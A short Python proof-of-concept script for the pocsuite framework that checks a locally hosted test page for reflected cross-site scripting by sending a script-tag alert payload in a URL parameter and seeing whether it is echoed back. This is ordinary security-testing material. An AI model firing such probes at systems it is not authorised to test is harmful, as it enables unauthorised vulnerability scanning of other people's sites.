#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import requests






class TestPOC(POCBase):
    vulID   ='123'
    version = '1'
    author = '小雨'
    vulDate = '2017-01-06'
    name = 'xss'
    appPowerLink = 'http://192.168.116.128/'
    appName = '无'
    appVersion = '0'
    vulType = ' XSS '
    desc = '''
   本地搭建环境 随便写写
    '''
    samples = ['']

    def _verify(self):
        result = {}

        vulurl = self.url + "/xss.php?XSS=<script>alert(1);</script>"

        resp = requests.get(vulurl)
        print resp.url

        if '<script>alert(1);</script>' in resp.content:
            result['XSSInfo'] = {}
            result['XSSInfo']['URL'] = resp.url

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)